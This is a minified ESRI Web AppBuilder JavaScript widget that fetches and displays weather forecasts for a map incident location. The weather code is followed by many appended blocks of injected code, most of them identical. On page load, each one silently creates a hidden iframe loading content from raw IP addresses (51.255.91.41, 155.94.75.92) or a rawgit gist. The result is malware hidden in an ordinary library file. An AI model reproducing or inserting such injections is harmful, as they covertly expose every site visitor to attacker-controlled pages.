// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/dom-class dojo/dom-construct esri/geometry/webMercatorUtils esri/request".split(" "),function(p,h,d,f,r,q){return p("WeatherInfo",null,{constructor:function(a,b,d){this.tab=a;this.container=b;this.parent=d;this.weatherURL=a.url;this.weatherDict={119:["Cloudy","cloudy5.png","cloudy5.png"],377:["Moderate or heavy showers of ice pellets","hail.png","hail.png"],374:["Light showers of ice pellets","hail.png","hail.png"],350:["Ice pellets","hail.png","hail.png"],
353:["Light rain shower","light_rain.png","light_rain.png"],302:["Moderate rain","light_rain.png","light_rain.png"],296:["Light rain","light_rain.png","light_rain.png"],293:["Patchy light rain","light_rain.png","light_rain.png"],266:["Light drizzle","light_rain.png","light_rain.png"],263:["Patchy light drizzle","light_rain.png","light_rain.png"],122:["Overcast","overcast.png","overcast.png"],359:["Torrential rain shower","shower3.png","shower3.png"],308:["Heavy rain","shower3.png","shower3.png"],
365:["Moderate or heavy sleet showers","sleet.png","sleet.png"],362:["Light sleet showers","sleet.png","sleet.png"],320:["Moderate or heavy sleet","sleet.png","sleet.png"],317:["Light sleet","sleet.png","sleet.png"],314:["Moderate or Heavy freezing rain","sleet.png","sleet.png"],311:["Light freezing rain","sleet.png","sleet.png"],284:["Heavy freezing drizzle","sleet.png","sleet.png"],281:["Freezing drizzle","sleet.png","sleet.png"],185:["Patchy freezing drizzle nearby","sleet.png","sleet.png"],182:["Patchy sleet nearby",
"sleet.png","sleet.png"],395:["Moderate or heavy snow in area with thunder","snow4.png","snow4.png"],335:["Patchy heavy snow","snow4.png","snow4.png"],230:["Blizzard","snow4.png","snow4.png"],227:["Blowing snow","snow4.png","snow4.png"],371:["Moderate or heavy snow showers","snow5.png","snow5.png"],338:["Heavy snow","snow5.png","snow5.png"],389:["Moderate or heavy rain in area with thunder","tstorm3.png","tstorm3.png"],392:["Patchy light snow in area with thunder","snow2.png","snow2_night.png"],386:["Patchy light rain in area with thunder",
"tstorm1.png","tstorm1_night.png"],368:["Light snow showers","snow2.png","snow2_night.png"],356:["Moderate or heavy rain shower","shower2.png","shower2_night.png"],332:["Moderate snow","snow3.png","snow3_night.png"],329:["Patchy moderate snow","snow2.png","snow2_night.png"],326:["Light snow","snow1.png","snow1_night.png"],323:["Patchy light snow","snow1.png","snow1_night.png"],305:["Heavy rain at times","shower2.png","shower2_night.png"],299:["Moderate rain at times","shower2.png","shower2_night.png"],
260:["Freezing fog","fog.png","fog_night.png"],248:["Fog","fog.png","fog_night.png"],200:["Thundery outbreaks in nearby","tstorm1.png","tstorm1_night.png"],179:["Patchy snow nearby","snow1.png","snow1_night.png"],176:["Patchy rain nearby","shower1.png","shower1_night.png"],143:["Mist","mist.png","mist_night.png"],116:["Partly Cloudy","cloudy3.png","cloudy3_night.png"],113:["Clear/Sunny","sunny.png","sunny_night.png"]}},queryTabCount:function(a,b,d){this.updateTabCount(this.parent.incidents.length,
d,!1)},updateTabCount:function(a,b){a=this.parent.incidents.length;"undefined"!==typeof a&&0===a?d.contains(b,"noFeatures")||d.add(b,"noFeatures"):d.contains(b,"noFeatures")&&d.remove(b,"noFeatures")},updateForIncident:function(a){this.container.innerHTML="";d.add(this.container,"loading");a=a.y+","+a.x;var b="";"Weather"!==this.tab.label?(b=this.weatherURL,this.container.innerHTML="\x3cimg style\x3d'height:100%;' src\x3d'"+this.weatherURL+"' /\x3e"):(b=this.weatherURL+"\x26q\x3d"+a,q({url:b,callbackParamName:"callback"},
{useProxy:!1}).then(h.hitch(this,function(a){return this._resultsHandler(a)}),h.hitch(this,function(a){a=this._errorHandler(a);console.log(a)})))},_resultsHandler:function(a){a=a.data;console.log(a);var b=a.current_condition;a=a.weather;var k=1;this.container.innerHTML="";d.remove(this.container,"loading");var g=f.create("div",{style:"width:"+165*(a.length+3)+"px;"},this.container);d.add(g,"SAT_tabPanelContent");var l=this.parent.config.celsius?"C":"F",c,e;if(0<b.length){b=b[0];c=b.localObsDateTime.split(" ");
e=c[2];c=c[1].split(":");c=parseInt(c[0],10);if("AM"===e){if(6>c||12===c)k=2}else 6<c&&12>c&&(k=2);e=b.temp_F;this.parent.config.celsius&&(e=b.temp_C);c=b.weatherCode;c=this.weatherDict[parseInt(c,10)];c=this.parent.nls.now+"\x3cbr/\x3e\x3cimg style\x3d'height:45px' src\x3d'"+this.parent.folderUrl+"images/w/"+c[k]+"' /\x3e\x3cbr/\x3e"+e+"\x26deg;"+l;e=f.create("div",{innerHTML:c},g);d.add(e,"SATcolSmall");d.add(e,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder");e=b.windspeedMiles;c=" mph";
this.parent.config.celsius&&(e=b.windspeedKmph,c=" km/h");c=this.parent.nls.wind+"\x3cbr/\x3e\x3cspan style\x3d'font-size: 30px; line-height:47px'\x3e"+b.winddir16Point+"\x3c/span\x3e\x3cbr/\x3e"+e+c;b=f.create("div",{innerHTML:c},g);d.add(b,"SATcolSmall");d.add(b,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder")}for(e=0;e<a.length;e++){var b=a[e],h=this._getDay(b.date),m=b.tempMaxF||b.maxtempF,n=b.tempMinF||b.mintempF;this.parent.config.celsius&&(m=b.tempMaxC||b.maxtempC,n=b.tempMinC||
b.mintempC);c=b.weatherCode;c=this.weatherDict[parseInt(c,10)];c=h+"\x3cbr/\x3e\x3cimg style\x3d'height:45px' src\x3d'"+this.parent.folderUrl+"images/w/"+c[k]+"' /\x3e\x3cbr/\x3e"+m+"\x26deg;"+l+" | "+n+"\x26deg;"+l;b=f.create("div",{innerHTML:c},g);d.add(b,"SATcolSmall");d.add(b,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder")}a=f.create("div",{innerHTML:'\x3cbr/\x3e\x3cbr/\x3e\x3cbr/\x3e\x3cspan style\x3d"font-size:11px;color:#6e6e6e"\x3e'+this.parent.nls.poweredBy+'\x3cbr/\x3e\x3ca style\x3d"color:#6e6e6e;text-decoration:none" href\x3d"http://www.worldweatheronline.com/" title\x3d"Free Weather API" target\x3d"_blank"\x3eWorld Weather Online\x3c/a\x3e\x3c/span\x3e'},
g);d.add(a,"SATcolSmall");d.add(a,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder");d.add(a,"SATcolLast")},_getDay:function(a){a=a.split("-");a="SUN MON TUE WED THU FRI SAT".split(" ")[(new Date(a[0],a[1]-1,a[2])).getDay()];return this.parent.nls[a]},_errorHandler:function(a){console.log(a.message);a=f.create("div",{innerHTML:a.message},this.container);d.add(a,"SATcolSmall");d.add(a,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});